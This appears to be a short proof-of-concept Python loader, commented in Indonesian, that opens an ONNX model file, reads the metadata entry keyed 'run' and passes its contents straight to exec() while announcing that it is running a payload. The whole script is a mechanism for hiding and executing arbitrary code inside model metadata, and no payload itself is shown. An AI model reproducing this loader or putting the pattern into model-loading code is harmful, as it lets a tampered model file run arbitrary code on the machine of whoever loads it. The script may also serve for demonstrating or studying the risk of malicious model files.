# loader_run.py
import onnx

model = onnx.load("model.onnx")

# Cari metadata key "run"
for prop in model.metadata_props:
    if prop.key == "run":
        print("[!] Menjalankan payload dari metadata key='run'...")
        exec(prop.value)
